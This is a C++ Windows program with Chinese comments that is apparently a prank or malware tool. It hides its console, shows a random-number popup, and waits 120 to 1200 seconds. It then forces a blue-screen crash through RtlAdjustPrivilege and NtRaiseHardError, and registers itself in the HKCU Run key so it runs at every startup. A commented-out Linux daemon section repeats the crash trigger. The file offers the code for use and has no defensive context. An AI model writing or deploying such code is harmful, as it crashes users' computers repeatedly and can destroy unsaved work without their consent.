#include <iostream>
#include <cstdlib>
#include <ctime>
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
using namespace std;

typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError) (NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege) (ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

int main()
{
    //隐藏控制台
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    //抽取一个120到1200之间的随机数
    srand(time(NULL));
    int num = rand() % 1081 + 120;

    //弹窗提示抽取到的随机数
    string msg = "您抽取到的随机数是" + to_string(num);
    MessageBox(NULL, msg.c_str(), "提示", MB_OK);

    //暂停等待（等待时间为抽取到的随机数）
    Sleep(num * 1000);

    //执行一个程序
    bsod();

    //将自己添加到开机启动项
    HKEY hKey;
    LONG lRet = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
    if (lRet == ERROR_SUCCESS)
    {
        char path[MAX_PATH];
        GetModuleFileName(NULL, path, MAX_PATH);
        lRet = RegSetValueEx(hKey, "MyProgram", 0, REG_SZ, (BYTE*)path, strlen(path));
        if (lRet == ERROR_SUCCESS)
        {
            cout << "添加成功" << endl;
        }
        else
        {
            cout << "添加失败" << endl;
        }
        RegCloseKey(hKey);
    }
    else
    {
        cout << "打开注册表失败" << endl;
    }

    return 0;
}

// void createDaemon() {
//     pid_t pid = -1;
//     //创建子进程，父进程退出
//     pid = fork();
//     if (-1 == pid) {
//         perror("fork");
//         exit(1);
//     }
//     //父进程退出
//     if (pid > 0) {
//         exit(0);
//     }
//     //创建新会话
//     pid = setsid();
//     if (-1 == pid) {
//         perror("setsid");
//         exit(1);
//     }
//     //改变当前工作目录
//     int ret = -1;
//     ret = chdir("/tmp/");
//     if (-1 == ret) {
//         perror("chdir");
//         exit(1);
//     }
//     //设置权限掩码
//     umask(0);
//     //关闭文件描述符
//     close(STDIN_FILENO);
//     close(STDOUT_FILENO);
//     close(STDERR_FILENO);
// }
// 
// int cD() {
//     // 创建守护进程
//     createDaemon();
//     
//     // 执行核心任务
//     while (1) {
//         if (getppid() == 1) {
//             bsod();
//             break;
//         }
//         sleep(1);
//     }
//     
//     return 0;
// }

int bsod() {
    BOOLEAN bEnabled;
    ULONG uResp;
    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled); // 调用NtRaiseHardError需要有SeShutdownPrivilege
    NtCall2(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &uResp); // BSOD

    return 0;
}